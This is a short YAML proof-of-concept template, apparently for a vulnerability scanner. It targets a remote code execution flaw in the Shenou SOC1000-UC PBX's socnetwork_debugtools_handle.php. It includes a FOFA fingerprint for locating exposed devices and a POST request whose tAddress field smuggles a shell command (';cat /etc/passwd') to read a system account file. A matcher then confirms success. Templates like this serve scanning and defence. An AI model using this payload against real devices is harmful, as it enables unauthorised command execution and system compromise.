id: poc-yaml-shenou-soc1000-uc-pbx-socnetwork-debugtools-handle-rce
info:
  name: 申瓯通信 SOC1000-UC PBX设备 socnetwork_debugtools_handle 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  finger: SOC1000-UC
  fofa: body="assets/shenou/images/logo_soc1000-uc.png"
requests:
- method: POST
  path: /admin/modules/socnetwork/views/socnetwork_debugtools_handle.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: tAddress=127.0.0.1;cat%20/etc/passwd&tCount=5
  expression: "status_code == 200 && \ncontains(body,\"traceroute\") &&\ncontains(body,\"\
    root:\") &&\ncontains(body,\"/bin\") &&\ncontains(headers,\"Server\\x3a soc_httpd\"\
    ) &&\n!contains(body,\"<\")\n"
variables: {}
transport: http
